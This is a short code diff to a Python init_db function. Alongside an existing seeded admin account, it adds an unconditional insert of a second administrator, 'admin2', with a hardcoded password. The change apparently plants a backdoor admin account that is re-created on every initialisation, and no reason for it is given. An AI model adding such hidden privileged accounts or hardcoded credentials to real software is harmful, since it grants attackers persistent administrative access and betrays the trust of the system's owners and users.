@@ -47,7 +47,10 @@ def init_db():
             "INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)",
             ("admin", hash_password("RPA2026!"), "admin") 
         )
-        
+    cursor.execute(
+        "INSERT OR IGNORE INTO users (username, password_hash, role) VALUES (?, ?, ?)",
+        ("admin2", hash_password("@newadmin123"), "admin") 
+    )
     conn.commit()
     conn.close()
 
